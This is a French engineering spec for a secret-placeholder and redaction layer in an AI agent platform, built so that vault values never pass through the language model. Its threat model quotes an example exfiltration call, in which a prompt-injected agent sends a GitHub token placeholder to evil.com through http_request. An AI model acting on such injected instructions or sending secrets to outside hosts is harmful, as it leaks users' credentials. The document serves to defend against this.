# Vault placeholders — secrets utilisables sans jamais transiter par le LLM

> Spec du système de **placeholders de secrets** : un agent référence un secret par `{{secret:KEY}}` dans n'importe quel argument d'outil ; une couche de substitution dans le tool-executor remplace le placeholder par la valeur réelle juste avant l'exécution. La valeur n'apparaît jamais dans le contexte LLM — ni en entrée (substitution), ni en sortie (redaction des résultats).
>
> Origine du besoin : aujourd'hui `get_secret` retourne `{ value }` au LLM. Dès cet instant le secret est dans l'historique de conversation : persisté en clair dans `messages.tool_calls`, renvoyé au provider LLM à chaque tour suivant, inclus dans le compacting, broadcast en SSE multi-device, visible dans l'UI. Le vault chiffre au repos, mais le secret fuit à l'usage.
>
> Cette spec a été vérifiée contre le codebase : chaque symbole/fichier cité existe sauf mention « nouveau ».
>
> **Statut : P1+P2 IMPLÉMENTÉS** (substitution d'entrée, redaction de sortie, `redact_secret_leak`, bloc prompt, hot cache — voir § 13). P3-P7 à venir. Décisions fondateur actées le 2026-06-12.

---

## 1. Modèle de menace — ce qu'on résout, ce qu'on ne résout pas

Deux menaces distinctes, à ne pas confondre :

1. **Le secret transite par le LLM** (résolu par cette spec, phases P1–P3). Conséquences actuelles : persistance en clair, envoi au provider, compacting, SSE, UI. Les placeholders éliminent tout ça d'un coup.
2. **L'agent route le secret vers une destination hostile** (résolu partiellement, phase P7). Un agent victime de prompt injection (ex. via une page lue par `browse_url`) peut écrire `http_request(url: 'https://evil.com', headers: { x: '{{secret:GITHUB_TOKEN}}' })` — la substitution exécutera fidèlement l'exfiltration. La défense est le **scoping par secret** (`allowedTools`/`allowedHosts`, § 9) : le placeholder devient inutilisable hors de sa destination légitime.

Hors scope (v1) : l'exfiltration par code exécuté (`run_shell` peut toujours lancer un script qui lit l'env et l'envoie ailleurs). C'est le modèle de menace « code execution », traité par le sandboxing des workspaces, pas par cette couche.

---

## 2. Décisions actées (fondateur, 2026-06-12)

| Sujet | Décision |
|---|---|
| Approche | Placeholders substitués à l'exécution des tools — la valeur ne transite jamais par le LLM |
| Syntaxe | `{{secret:KEY}}` (pas `:KEY:` — collisions emoji-codes, ports, YAML) |
| `get_secret` | Ne retourne **plus jamais** la valeur — retourne le placeholder + mode d'emploi |
| Escape hatch | `reveal_secret` existe mais **prompte TOUJOURS l'utilisateur** (approbation humaine obligatoire, jamais automatique) — une prompt injection ne peut pas l'exploiter silencieusement |
| Placeholder inconnu | **Fail-closed** : le tool n'est pas exécuté, erreur explicite retournée au LLM |
| `run_shell` | Injection par **variable d'environnement**, jamais splice dans la ligne de commande |
| Scripts agent | Pattern enseigné dans la description du tool : secret lu depuis l'env (`process.env.X`), passé via `X={{secret:KEY}} bun run script.ts` — jamais hardcodé dans le fichier |
| Redaction rétroactive | `redact_message` est **cassé** (il ne touche pas `tool_calls`, rejoués verbatim au LLM — § 7, diagnostic) — remplacé par `redact_secret_leak(key)` : scan par valeur de clé vault sur `content` + `tool_calls` + résumés de compacting, remplacement chirurgical par le placeholder, event SSE |
| Périmètre d'expansion | **Opt-in par flag `expandsSecrets`** (décidé à l'implémentation P1) : seuls les tools dont les args sortent de la plateforme expansent (`run_shell`, `http_request`, `browse_url`, `screenshot_url`, `write_file`, `edit_file`, `multi_edit`) + custom/MCP tools toujours. Partout ailleurs le placeholder reste du texte inerte — l'expansion uniforme aurait créé une auto-fuite : `memorize('{{secret:X}}')` aurait injecté la vraie valeur dans une mémoire ré-injectée en prompt |

Recommandations de la spec (à confirmer à l'implémentation, marquées « reco ») : extension des tools vault aux sub-agents (§ 10), transforms `|base64`/`|urlencode` (§ 7), colonnes de scoping créées dès la v1 (§ 9).

---

## 3. Principes directeurs

1. **Un seul point de substitution.** Tous les tool calls (natifs, custom `custom_<slug>`, MCP) passent par `executeSingleTool()` (`src/server/services/tool-executor.ts:211`) — la couche s'y branche et couvre tout, y compris les custom tools, gratuitement.
2. **Étanche dans les deux sens.** Substitution des placeholders en entrée ET redaction des valeurs en sortie (§ 6). Sans la redaction de sortie, `run_shell('echo $TOKEN')` ou une API qui echo ses headers dans une erreur renvoie le secret dans le contexte. Les deux shippent ensemble — l'un sans l'autre est un faux sentiment de sécurité.
3. **Fail-closed.** Une clé inconnue ⇒ refus d'exécution + erreur actionnable. Jamais d'exécution avec le placeholder littéral (un `http_request` avec un faux token partirait quand même sur le réseau).
4. **Ce qui est persisté/diffusé = les placeholders.** `toolCallsLog` (et donc `messages.tool_calls`), les events SSE `chat:tool-call`, le compacting : tout voit les args **originaux** (placeholders). La substitution travaille sur une copie profonde, jamais sur `tc.args`.
5. **L'humain dans la boucle pour toute révélation.** `reveal_secret` réutilise l'infra `secret-prompts` (suspend/resume) avec une carte d'approbation ; refus par défaut.
6. **Forcer la bonne pratique, pas la contourner.** Le cas « script qui appelle une API » est couvert par env-var (§ 5) — exactement ce qu'un dev devrait faire de toute façon. Pas de hardcode possible, pas nécessaire non plus.
7. **Audit dès la v1.** Chaque expansion émet un event ; `last_used_at` visible dans l'UI vault. Aujourd'hui il n'existe aucune trace de qui utilise quoi.

---

## 4. Grammaire & résolution

```
{{secret:KEY}}              → valeur brute
{{secret:KEY|base64}}       → base64(valeur)           (P6, reco)
{{secret:KEY|urlencode}}    → encodeURIComponent(val)  (P6, reco)
```

- Regex : `/\{\{secret:([A-Z][A-Z0-9_]*)(?:\|(base64|urlencode))?\}\}/g` — les clés vault sont déjà en SCREAMING_SNAKE_CASE (convention `prompt_secret`).
- Résolution : `getSecretValue(key)` (`src/server/services/vault.ts:150`) — **lazy**, seules les clés effectivement référencées dans l'appel sont déchiffrées.
- **Single-pass, non récursif** : si une valeur de secret contient elle-même un motif `{{secret:…}}`, il n'est PAS ré-expansé (pas de chaîne d'expansion exploitable).
- Substitution = remplacement de sous-chaîne dans **chaque feuille string** des args (parcours récursif du JSON). Couvre les placeholders enfouis dans un body JSON-stringifié, un header, un content de fichier.
- Clé inexistante ⇒ le tool ne s'exécute pas ; résultat : `{ error: 'Unknown secret "FOO_TOKEN". Use search_secrets to list available keys, or prompt_secret to ask the user for it.' }`.

### Nouveau module : `src/server/services/secret-substitution.ts`

```typescript
extractPlaceholders(args: unknown): Array<{ key: string; transform?: 'base64'|'urlencode' }>
substituteArgs(args: unknown, resolved: Map<string, string>): unknown   // copie profonde
redactResult(result: unknown, hot: Map<string, string>): unknown        // § 6
toEnvName(key: string): string                                          // → HIVEKEEP_SECRET_<KEY>
```

Branchement dans `executeSingleTool` (tool-executor.ts:227, avant `toolDef.execute`) :

```
1. le tool expanse-t-il ? (`expandsSecrets` au registry, OU nom `custom_*`/`mcp_*`) — sinon le placeholder traverse en texte inerte
2. extractPlaceholderKeys(tc.args) ; si vide → exécution normale (zéro coût pour 99 % des appels)
3. résoudre chaque clé (fail-closed si inconnue) ; alimenter le hot cache (§ 6)
4. enforcement scoping (P7) : allowedTools / allowedHosts (§ 9)
5. tool « secretsViaEnv » (run_shell, P3) → réécriture env (§ 5) ; sinon substitutePlaceholders()
6. exécuter avec les args substitués (tc.args reste intact pour le log/SSE/persistance)
7. redactSecretsInResult() sur le retour AVANT le return (couvre resultMap → SSE chat:tool-result + toolResults → LLM + toolCallsLog → DB) — appliqué à TOUS les tools, expansants ou non
8. émettre vault:secret-used (§ 11, P4)
```

---

## 5. `run_shell` — injection par environnement

Splicer la valeur dans la ligne de commande est fragile (quoting) et fuit (visible dans `ps`, dans les messages d'erreur bash, dans `stderr`). À la place :

- `runShellTool` est marqué `secretsViaEnv: true` (nouveau flag optionnel sur `ToolRegistration`, défaut `false`).
- Pour ces tools, chaque `{{secret:KEY}}` dans les feuilles string est réécrit en `${HIVEKEEP_SECRET_KEY}` (sans quotes ajoutées — fonctionne en contexte double-quote et nu ; les valeurs avec espaces sont rares pour des tokens, et la description du tool enseigne le double-quoting).
- Les valeurs sont passées au tool via le bag d'options existant : `toolDef.execute(args, { abortSignal, secretEnv })` — même canal d'extension que `abortSignal` (cf. tool-abort-propagation). `run_shell` merge `secretEnv` dans son appel `resolveToolEnv(ctx, base)` (`shell-tools.ts:317`).
- **Précédent existant** : `resolveToolEnv` superpose déjà le PAT git par task (`HIVEKEEP_GH_TOKEN`) — « the PAT never appears as a literal here ». On généralise ce pattern.
- Limitation documentée : un placeholder en contexte single-quote (`'…{{secret:X}}…'`) devient `'…${HIVEKEEP_SECRET_X}…'` non expansé par bash. La description du tool le dit ; la redaction de sortie rattraperait de toute façon un echo accidentel.

Le cas fondateur « script qui appelle une API » (ni mini-app ni custom tool) :

```typescript
// le script — jamais de secret en dur, lisible/partageable sans risque
const token = process.env.GITHUB_TOKEN
```
```bash
# l'appel par l'agent
GITHUB_TOKEN={{secret:GITHUB_TOKEN}} bun run fetch-issues.ts
```

Et si un secret doit finir **dans un fichier** (`.netrc`, config) : la substitution s'applique aussi à `write_file`/`edit_file` — le secret atterrit en clair sur disque (inhérent au besoin, action délibérée), mais le LLM ne l'a jamais vu.

---

## 6. Redaction de sortie — le sens retour

Après chaque exécution, `redactResult()` scanne le résultat (feuilles string, récursif, y compris les champs `error`) et remplace toute occurrence d'une valeur de secret connue par son placeholder `{{secret:KEY}}`.

- **Hot cache** : `Map<key, value>` en mémoire process des secrets déjà expansés au moins une fois depuis le boot. Le scan systématique se fait contre ce cache (le secret qui fuit est presque toujours celui qu'on vient d'utiliser) — pas de déchiffrement du vault entier à chaque tool call. Invalidé sur `update_secret`/`delete_secret` (et purgé du placeholder correspondant).
- Garde-fou : valeurs < 6 caractères jamais redactées (éviter de cribler les outputs pour `"yes"`).
- S'exécute dans `executeSingleTool` avant le `return` ⇒ couvre d'un coup le retour LLM, l'event SSE `chat:tool-result` (tool-executor.ts:122-141) et la persistance `toolCallsLog`.
- **Logs serveur** : `http-request-tools.ts` logge les headers en DEBUG après substitution ⇒ exposer `redactKnownSecrets(s: string)` depuis le module et l'appliquer dans ce log (et tout futur log d'args post-substitution). À vérifier au moment de l'implémentation : autres logs de tools loggant des args substitués.
- Le même moteur de scan/remplacement sert **rétroactivement** : `redact_secret_leak` (§ 7) l'applique à la DB (historique + résumés) au lieu du flux.

---

## 7. Les tools vault — nouveaux contrats

### `get_secret` (modifié — ne retourne plus jamais la valeur)

```typescript
// avant : { value: string }
// après :
{
  placeholder: '{{secret:GITHUB_TOKEN}}',
  key: 'GITHUB_TOKEN',
  description: 'PAT GitHub du founder',
  usage: 'Insert this placeholder verbatim in any tool argument; it is replaced by the real value at execution time. You never see the real value. For shell scripts, pass it as an environment variable: `GITHUB_TOKEN={{secret:GITHUB_TOKEN}} bun run script.ts` and read process.env.GITHUB_TOKEN — never hardcode secrets in files. If you genuinely need the raw value, reveal_secret asks the user for permission.'
}
```

Description du tool réécrite pour enseigner le pattern (placeholder verbatim, env-var pour les scripts, double quotes en shell). C'est le réflexe qui remplace l'ancien « je récupère et je colle ».

### `reveal_secret` (nouveau — approbation humaine obligatoire)

- Input : `{ key: string, reason: string }` (`reason` affiché tel quel à l'utilisateur).
- Réutilise l'infra `secret-prompts` (`src/server/services/secret-prompts.ts` : suspend/resume, expiry, endpoints respond/cancel, SSE `prompt:secret-request`/`prompt:secret-resolved`) avec un nouveau `purpose: 'reveal'`. Aucun champ de saisie — juste Approuver / Refuser.
- UI : carte in-chat (pattern `request_tool_access` / `AlertDialog`) : avatar agent, clé, raison, warning « la valeur sera visible par le modèle et dans l'historique de CE tour ». Refus par défaut (dismiss/expiry = refus, comme `request_tool_access`).
- Sur approbation : message de reprise contenant la valeur, persisté avec `redactPending: true` (bloque le compacting — filtre existant `compacting.ts:265` ; c'est le premier vrai writer de ce flag, mort jusqu'ici). **Auto-redact à la fin du tour** : le contenu est remplacé par `[Secret GITHUB_TOKEN revealed to the model on <date> — value redacted]` via le moteur commun de scan/remplacement (celui de `redact_secret_leak`, qui nettoie aussi `tool_calls` si la valeur y a rebondi). Un sweep au boot redacte tout message resté `redactPending` (crash au milieu du tour). La valeur n'est dans le contexte que pour le tour qui la consomme ; elle a été vue par le provider pour ce tour — c'est le coût que l'humain approuve explicitement.
- Sur refus : reprise avec note neutre « declined » (pattern existant des secret-prompts).
- Émet `vault:secret-revealed` (audit, § 11).

### `redact_secret_leak` (nouveau — remplace `redact_message`, cassé)

Diagnostic de l'existant (`redact_message` → `redactMessage`, `vault.ts:162`) :

1. **Ne touche que `content`, jamais `tool_calls`** — or la fuite la plus courante est dans le JSON `messages.tool_calls` (le retour `{ value }` de l'ancien `get_secret`, un secret echo'é par un tool). Et `buildMessageHistory` (`agent-engine.ts:2656`) rejoue les `toolCalls` persistés **sans aucune vérification de `isRedacted`** : après « redaction », le secret continue de partir chez le provider à chaque tour et reste en clair en DB. Fausse assurance de nettoyage.
2. `findMessageByContent` (`vault.ts:190`) ne cherche que dans `content` → un secret fuité dans un tool result donne « Message not found ».
3. Remplacement **total** du message (perte du contenu non-secret), contrairement à ce que la description promet.
4. Aucun event SSE — le secret reste affiché sur tous les devices jusqu'au refetch.
5. `redactPending` est un **flag mort** : personne ne le met jamais à `true` — la mécanique « redaction blocks compacting » ne s'est jamais déclenchée. Un message compacté avant redaction laisse le secret dans le résumé, jamais régénéré.

Le remplaçant — redaction **par clé vault**, pas par message :

- Input : `{ key: string }`. Le serveur déchiffre la valeur, scanne (`LIKE` échappé) **`messages.content` ET `messages.tool_calls` ET les résumés de compacting**, et remplace chaque occurrence de la valeur par `{{secret:KEY}}` — chirurgical : le reste du message survit, et l'agent n'a jamais à réécrire le secret dans un argument.
- Portée : **toutes les conversations** (main, tasks, quick-sessions, tous agents) — une valeur fuitée est fuitée partout où elle apparaît.
- Retour : `{ cleaned: { messages: n, summaries: m } }` (compteurs, jamais d'extraits).
- `isRedacted` n'est PAS posé sur les messages nettoyés chirurgicalement (ils restent lisibles, juste avec le placeholder) — il reste réservé au remplacement total (auto-redact de `reveal_secret`, qui utilise le même moteur).
- SSE : `chat:messages-redacted` `{ agentId, messageIds }` (même pattern que `chat:messages-deleted`) → les clients re-fetchent les messages touchés.
- Cas « l'utilisateur colle un mot de passe dans le chat » : `create_secret(key, …)` d'abord (le secret entre au vault), puis `redact_secret_leak(key)` — ce flow remplace l'ancien `content_match`.
- Garde-fou : valeurs < 6 caractères refusées (même seuil que `redactResult`, § 6).
- Même moteur de scan/remplacement que `redactResult()` — appliqué rétroactivement à la DB au lieu du flux. Module commun dans `secret-substitution.ts`.
- `redact_message` est retiré du registry. `redactPending` (aujourd'hui flag mort, aucun writer) n'est PAS supprimé : il trouve son premier vrai usage en P5 — posé à `true` sur le message de reprise de `reveal_secret`, il bloque le compacting (filtre existant `compacting.ts:265`) tant que l'auto-redact de fin de tour n'a pas tourné, et un sweep au boot redacte tout message resté `redactPending` (récupération après crash au milieu d'un tour).

### Inchangés dans leur contrat, descriptions ajustées

`search_secrets` (mentionne les placeholders dans sa description), `create_secret`/`update_secret` (retournent désormais aussi le `placeholder` prêt à l'emploi), `prompt_secret` (son message de confirmation donne directement le placeholder — le flow complet demande → saisie → usage ne touche jamais le LLM), `delete_secret`.

### Transforms (P6, reco)

`|base64` et `|urlencode` couvrent ~95 % des besoins de dérivation (Basic auth = `{{secret:CREDS|base64}}`, secret dans une query string). Toute dérivation plus complexe = script + env-var. Pas d'autres transforms sans cas réel.

---

## 8. Éducation des agents — ce qu'ils doivent savoir, et où

Quatre surfaces d'enseignement, complémentaires. La règle : un agent qui ignore l'une des surfaces doit être rattrapé par la suivante (système auto-correcteur).

### 8.1 Le bloc `### Secrets` du system prompt (P1 — bloquant)

`prompt-builder.ts:1325-1329` enseigne aujourd'hui **l'ancien pattern** (« *use search_secrets(query) first to find the right key, then get_secret(key) to retrieve it* »). Non réécrit, le prompt contredirait le nouveau comportement — c'est un livrable de P1, pas un polish. Nouveau bloc :

```
### Secrets
- Secrets are referenced by PLACEHOLDER, never by value. get_secret(key) returns a placeholder
  like {{secret:GITHUB_TOKEN}} — insert it verbatim in any tool argument and the real value is
  substituted at execution time. You never see, and never need, the raw value.
- For shell commands and scripts: pass secrets as environment variables
  (GITHUB_TOKEN={{secret:GITHUB_TOKEN}} bun run script.ts, then read process.env.GITHUB_TOKEN).
  Never hardcode a secret value into a file you write.
- When a tool RESULT contains {{secret:KEY}}, the real value appeared there and was redacted
  before reaching you — the tool itself did receive/produce the real value. Do not retry
  assuming the substitution failed.
- A placeholder seen earlier in the conversation remains valid — reuse it directly, no need to
  call get_secret again. Use search_secrets(query) to discover keys.
- If a user shares a secret in chat: store it via create_secret(key, value), then call
  redact_secret_leak(key) — it scrubs every occurrence of the value from the whole history.
  To ask the user for a new secret, use prompt_secret (secure popup) — never ask in chat.
```

(La ligne sur `reveal_secret` — « *if you genuinely need the raw value (rare), reveal_secret(key, reason) asks the user for permission* » — s'ajoute en P5, pas avant : ne jamais mentionner un tool qui n'existe pas encore.)

### 8.2 Les descriptions de tools (P1/P3/P5)

La surface principale pour le « comment » : `get_secret` (placeholder verbatim, env-var pour les scripts), `run_shell` (double quotes, pattern `VAR={{secret:KEY}} cmd`), `search_secrets`, `prompt_secret`, `reveal_secret`. Déjà spécifié § 7 — c'est ce qui est dans le contexte au moment précis où l'agent choisit ses arguments.

### 8.3 L'enseignement in-band (auto-correcteur, P1)

Même un agent qui ignore tout le reste apprend à la première utilisation :

- le retour de `get_secret` contient le champ `usage` (mode d'emploi complet) ;
- l'erreur fail-closed est actionnable (« Use search_secrets to list available keys, or prompt_secret to ask the user ») ;
- la confirmation de `prompt_secret` donne directement le placeholder prêt à l'emploi ;
- une violation de scoping (P7) explique la restriction (« this secret is restricted to api.github.com »).

### 8.4 Le marqueur de redaction en sortie

Subtilité comportementale : un agent qui fait `run_shell('echo $HIVEKEEP_SECRET_X')` pour « vérifier que la variable est bien définie » verra `{{secret:X}}` dans l'output. Sans explication, il peut conclure que l'expansion a échoué (que le shell a littéralement printé le placeholder) et partir en boucle de retry/debug. La 3ᵉ ligne du bloc prompt (§ 8.1) traite exactement ce cas — à couvrir par un test de prompt manuel à l'implémentation (scénario : demander à un agent de vérifier qu'un secret est accessible).

### 8.5 Sub-agents et historique

- Le bloc `### Secrets` vit dans la branche `!params.isSubAgent` (prompt-builder.ts:1300) — si la reco § 10 (extension aux sub-agents) est retenue, une version courte du bloc doit être ajoutée au chemin sub-agent **dans la même phase**, sinon les tasks reçoivent les tools sans le mode d'emploi.
- Conversations existantes : l'historique contient d'anciens retours `{ value }` en clair. Pas de migration (on ne réécrit pas l'histoire) ; le nouveau retour de `get_secret` ré-enseigne le pattern à chaque appel, et le bloc prompt fait foi. La mission Queenie (« secrets via secure-input popups never chat ») reste valide telle quelle.

---

## 9. Scoping par secret (P7) — la vraie défense anti-exfiltration

Nouvelles colonnes sur `vault_secrets` (créées dès la migration v1, **reco**, enforcement en P7) :

```typescript
allowedTools: text('allowed_tools'),   // JSON string[] | null = tous (défaut, comportement actuel)
allowedHosts: text('allowed_hosts'),   // JSON string[] | null = tous
lastUsedAt: integer('last_used_at', { mode: 'timestamp_ms' }),
```

- `allowedTools` : l'expansion n'est autorisée que si `tc.name` ∈ liste. Ex. `OPENAI_KEY` → `['http_request']`.
- `allowedHosts` : pour les tools avec une URL identifiable (`http_request`, `browse_url`, `screenshot_url`), le host de l'URL cible doit matcher (exact ou suffixe `*.github.com`). Ex. `GITHUB_TOKEN` → `['api.github.com']`. C'est ce qui rend l'exfiltration par prompt injection inopérante : le placeholder ne « marche » que vers sa destination légitime.
- Violation ⇒ fail-closed + erreur explicite (« this secret is restricted to api.github.com ») + event d'audit avec `violation: true`.
- UI vault : deux champs optionnels (tags input) dans le formulaire d'édition de secret (`FormDialog` existant), vides par défaut. Affichage de `lastUsedAt` dans la liste.
- Limite assumée : `allowedHosts` ne contraint pas `run_shell` (le réseau y est libre) — `allowedTools` permet d'exclure `run_shell` pour les secrets sensibles.

---

## 10. Sub-agents (reco)

`get_secret` est aujourd'hui `availability: ['main']` — un sub-agent ne peut PAS utiliser de secret, ce qui bride les tasks (déploiements, appels API). Avec les placeholders, le sub-agent ne voit pas plus la valeur que le main agent : **étendre `get_secret` + `search_secrets` à `['main', 'sub-agent']`** devient raisonnable et débloque un vrai cas d'usage. `reveal_secret` reste `['main']` en v1 (l'approbation d'une révélation au milieu d'une task asynchrone est un flow à part — v2 si besoin, l'infra secret-prompts supporte déjà la reprise de sub-agent).

`create_secret`/`update_secret`/`delete_secret` restent `['main']`.

---

## 11. Audit

Events sur le bus existant (`src/server/hooks/`) :

- `vault:secret-used` `{ agentId, taskId?, toolName, secretKey, violation?: { type: 'unknown-key'|'tool-scope'|'host-scope' } }` — émis à chaque expansion (ou tentative refusée).
- `vault:secret-revealed` `{ agentId, secretKey, approved: boolean }`.

Effet de bord : mise à jour de `last_used_at`. v1 s'arrête là (event + colonne) ; une vue « journal d'usage » dans l'UI vault est notée v2.

---

## 12. Pièges connus (à tester unitairement)

1. **Mutation des args** : la substitution doit travailler sur une copie — `tc.args` part dans `toolCallsLog` (tool-executor.ts:159) puis `messages.tool_calls`. Un test vérifie que les args persistés contiennent le placeholder.
2. **SSE pré-substitution** : l'event `chat:tool-call` (émis par le stream-runner pendant le streaming) contient les args originaux — OK par construction, mais à vérifier (sse.md, piège n°« même donnée, deux formes »).
3. **Erreurs de tools** : le `catch` d'`executeSingleTool` (ligne 231) formate `err.message` — peut contenir la valeur (URL avec token dans une erreur fetch). `redactResult` doit s'appliquer aussi à ce chemin.
4. **Abort race** : si le tool est abandonné (race abort, ligne 246), son résultat est jeté — pas de fuite ; le placeholder d'abort est statique. RAS mais à ne pas casser.
5. **Valeurs multi-lignes / regex-spéciales** : le remplacement valeur→placeholder en sortie doit être littéral (pas de `new RegExp(value)` sans escape).
6. **Concurrence** : deux tools du même batch parallèle référençant le même secret — `getSecretValue` est idempotent, le hot cache est un simple Map process-wide, pas de lock nécessaire.
7. **mock.module** (gotcha connu des tests custom-tools/files) : mocker `vault.ts` dans les tests du substituteur via imports sync.
8. **`HIVEKEEP_SECRET_*` réservé** : `resolveToolEnv` ne doit pas laisser un agent définir lui-même une var `HIVEKEEP_SECRET_X=fake` dans sa commande pour shadow — sans gravité (c'est sa propre valeur qu'il écrase), mais le préfixe est documenté réservé.
9. **`buildMessageHistory` rejoue `tool_calls` sans regarder `isRedacted`** (agent-engine.ts:2656 + le chemin quick-session ~:2271) — c'est le bug racine de l'ancien `redact_message`. Test obligatoire : après `redact_secret_leak`, reconstruire l'historique et vérifier qu'aucune occurrence de la valeur ne subsiste dans les blocs `tool-use`/`tool-result` rejoués.
10. **Échappement LIKE** : la valeur du secret peut contenir `%`, `_`, quotes — le scan SQL doit utiliser des paramètres bindés + `ESCAPE`, et le remplacement en JS doit être littéral (pas de regex non échappée). Valeurs multi-lignes incluses.
11. **Résumés de compacting** : le scan rétroactif couvre la table des résumés, sinon un secret compacté avant la redaction survit dans le contexte via le summary.

---

## 13. Phases

| Phase | Contenu | Shippable |
|---|---|---|
| **P1** ✅ | Module `secret-substitution.ts` (grammaire, extract, substitute, fail-closed) + branchement `executeSingleTool` + flag `expandsSecrets` (SDK 0.12 + registry + 7 tools natifs) + nouveau retour `get_secret`/`create_secret`/`update_secret` + descriptions réécrites + **réécriture du bloc `### Secrets` du system prompt** (§ 8.1) + confirmation `prompt_secret` avec placeholder | **SHIPPED** avec P2 |
| **P2** ✅ | Redaction de sortie (hot cache + `redactSecretsInResult` + invalidation update/delete) + `redactKnownSecrets` appliqué au log DEBUG d'`http_request` + **`redact_secret_leak`** (moteur `scrubLeakedValue` à store injecté dans `secret-substitution.ts`, binder drizzle dans `secret-redaction.ts`, scan rétroactif content/tool_calls/résumés, SSE `chat:messages-redacted`, retrait de `redact_message`, i18n 10 locales) | **SHIPPED** |
| **P3** ✅ | `run_shell` via env : flag `secretsViaEnv` (SDK), réécriture `${HIVEKEEP_SECRET_*}` + `options.secretEnv`, merge dans l'env du subprocess, description du tool mise à jour | **SHIPPED** |
| **P4** ✅ | Audit : event bus `vault:secret-used` (+ `violation: unknown-key` sur fail-closed), colonne `last_used_at` stampée à chaque expansion (+ migration 0102 incluant `allowed_tools`/`allowed_hosts` pour P7), « Last used » sur la carte vault (10 locales). `vault:secret-revealed` arrive avec P5 | **SHIPPED** |
| **P5** | `reveal_secret` : purpose `'reveal'`, carte d'approbation in-chat, auto-redact fin de tour, i18n (10 locales) + ligne `reveal_secret` ajoutée au bloc prompt (§ 8.1) | Oui |
| **P6** | Transforms `\|base64` / `\|urlencode` | Oui |
| **P7** | Enforcement scoping `allowedTools`/`allowedHosts` + UI d'édition (tags) + erreurs explicites | Oui |
| **P8** | Docs : docs-site (page vault réécrite), `api.md` (purpose `reveal`, SSE `chat:messages-redacted`, events bus), `sse.md` (nouvel event), `schema.md` (colonnes), `prompt-system.md` (bloc Secrets), mise à jour de cette spec → SHIPPED | Avec chaque phase (règle n°12) — P8 = passe finale de cohérence |

Chaque phase : `bun run typecheck` + `bun run test` + tests unitaires dédiés (substituteur, redacteur, env-rewrite, fail-closed).
